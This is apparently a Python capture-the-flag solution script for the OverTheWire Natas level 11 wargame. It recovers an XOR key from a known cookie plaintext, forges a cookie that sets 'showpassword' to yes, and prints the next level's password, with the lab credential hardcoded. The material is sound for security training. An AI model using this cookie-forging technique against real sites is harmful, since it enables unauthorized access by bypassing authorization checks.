# Natas11 python solution
# By Emil 'Dota' Bak, 2019

import requests, base64
from urllib import unquote

# ***********************************************
URL = "http://natas11.natas.labs.overthewire.org"

auth_name = 'natas11'
auth_pass = 'U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************

# This challenge sees the user recieving an 'encrypted' cookie, that
# must be decrypted, changed and re-submitted to get the password.

# Starting off, the Cookie can be retrieved.
r = s.get(URL, params=dict(bgcolor='#ffffff'))
original_cookie = r.cookies['data']

# Note: Due to the nature of the encryption used,
# pythons 'dict' cannot be used here for dictionaries.
original_data   = '{"showpassword":"no","bgcolor":"#ffffff"}'
new_data        = '{"showpassword":"yes","bgcolor":"#ffffff"}'

# Function for finding the key used to XOR the Data.
# This works as the user has access to the data as it was BEFORE and
# AFTER the XOR.
def find_key(cookie, data):
    key = ''
    for x, y in zip(cookie, data):
        key += chr(ord(x) ^ ord(y))

    return key

XORkey = find_key(base64.b64decode(unquote(original_cookie)), original_data)

# XOR encrypts data with a given key
def xor_encrypt(data):
    key = XORkey[0:4]
    result = ''

    for i, d in enumerate(data):
        result += chr(ord(d) ^ ord(key[i % len(key)]))

    return result

# The new cookie, XOR encrypted & base64 encoded.
new_cookie = dict(data=base64.b64encode(xor_encrypt(new_data)))

r = s.get(URL, cookies=new_cookie)

for x in r.iter_lines():
    if "The password" in x:
        print x